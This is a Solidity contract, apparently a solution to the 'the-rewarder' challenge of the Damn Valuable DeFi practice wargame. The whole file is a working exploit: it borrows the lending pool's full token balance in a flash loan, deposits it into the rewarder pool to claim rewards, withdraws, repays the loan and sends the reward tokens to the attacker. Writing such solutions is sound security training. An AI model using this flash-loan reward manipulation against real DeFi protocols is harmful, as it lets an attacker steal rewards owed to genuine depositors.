pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";


contract RewarderAttack{

    FlashLoanerPool public flashLoanerPool;
    address attacker;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public dvt;
    RewardToken public rewardToken;



    
    constructor(address rewarderAddress,address flashLoanerAddress,address attackerAddress,address liquidityToken,address rewardTokenAddress) public {

        flashLoanerPool=FlashLoanerPool(flashLoanerAddress);
        rewarderPool=TheRewarderPool(rewarderAddress);
        attacker=attackerAddress;
        dvt= DamnValuableToken(liquidityToken);
        rewardToken=  RewardToken(rewardTokenAddress);
    }

    function attack() public {
        flashLoanerPool.flashLoan(dvt.balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 amount)  external{
        console.log(
        "Transferring  %s tokens",
        dvt.balanceOf(address(this))
    );
        
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
   console.log(
        "Transferring  %s tokens",
        dvt.balanceOf(address(this))
    );
 
        rewarderPool.withdraw(amount);
   console.log(
        "Transferring  %s tokens",
        dvt.balanceOf(address(this))
    );
        // payable(attacker).transfer(amount);
        console.log("%s",rewardToken.balanceOf(address(this)));
        rewardToken.transfer(attacker,rewardToken.balanceOf(address(this)));

        dvt.transfer(address(flashLoanerPool),amount);
    }

}